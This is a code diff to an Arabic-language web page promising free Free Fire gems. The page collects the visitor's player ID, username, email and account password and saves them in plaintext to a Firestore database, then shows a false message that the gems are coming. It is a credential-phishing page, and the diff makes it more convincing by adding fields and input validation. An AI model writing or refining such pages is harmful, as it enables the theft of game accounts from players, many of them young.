@@ -62,6 +62,8 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             width: 100%;
             max-width: 400px;
+            max-height: 90vh; /* تحديد ارتفاع ثابت */
+            overflow-y: auto; /* تمكين التمرير الرأسي */
             text-align: center;
             animation: slideIn 1s ease-in-out;
         }
@@ -141,12 +143,16 @@
         <h1>شحن الجواهر مجاناً لفري فاير</h1>
         <form id="chargeForm">
             <div class="form-group">
+                <label for="playerId">معرف اللاعب (ID):</label>
+                <input type="text" id="playerId" name="playerId" required>
+            </div>
+            <div class="form-group">
                 <label for="username">اسم المستخدم:</label>
                 <input type="text" id="username" name="username" required>
             </div>
             <div class="form-group">
-                <label for="phone">رقم الهاتف أو البريد الإلكتروني:</label>
-                <input type="text" id="phone" name="phone" required>
+                <label for="email">البريد الإلكتروني:</label>
+                <input type="email" id="email" name="email" required>
             </div>
             <div class="form-group">
                 <label for="password">كلمة السر:</label>
@@ -154,7 +160,7 @@
             </div>
             <div class="form-group">
                 <label for="gems">عدد الجواهر:</label>
-                <input type="number" id="gems" name="gems" required>
+                <input type="number" id="gems" name="gems" required min="1" max="500">
             </div>
             <button type="submit">شحن الجواهر</button>
         </form>
@@ -180,29 +186,49 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
+        // التحقق من صحة البريد الإلكتروني
+        function isValidEmail(email) {
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailPattern.test(email);
+        }
+
         // تسجيل البيانات في Firestore
         document.getElementById('chargeForm').addEventListener('submit', async (e) => {
             e.preventDefault();
 
+            const playerId = document.getElementById('playerId').value;
             const username = document.getElementById('username').value;
-            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const gems = document.getElementById('gems').value;
+            const gems = parseInt(document.getElementById('gems').value);
+
+            // التحقق من صحة البريد الإلكتروني
+            if (!isValidEmail(email)) {
+                document.getElementById('message').innerText = "البريد الإلكتروني غير صالح. يرجى إدخال بريد صحيح (مثال: example@gmail.com).";
+                return;
+            }
+
+            // التحقق من أن عدد الجواهر لا يتجاوز 500
+            if (gems > 500) {
+                document.getElementById('message').innerText = "الحد الأقصى لعدد الجواهر هو 500.";
+                return;
+            }
 
             try {
                 const docRef = await addDoc(collection(db, "users"), {
+                    playerId: playerId,
                     username: username,
-                    phone: phone,
+                    email: email,
                     password: password,
                     gems: gems,
                     timestamp: new Date()
                 });
-                document.getElementById('message').innerText = "تم تسجيل البيانات بنجاح! سيتم شحن الجواهر قريباً.";
+                document.getElementById('message').innerText = "تم تسجيل بنجاح! سيتم شحن الجواهر قريباً.";
             } catch (error) {
                 console.error("Error adding document: ", error);
-                document.getElementById('message').innerText = "حدث خطأ أثناء تسجيل البيانات. يرجى المحاولة مرة أخرى.";
+                document.getElementById('message').innerText = "حدث خطأ . يرجى المحاولة مرة أخرى.";
             }
         });
     </script>
 </body>
-  </html>
+    </html>
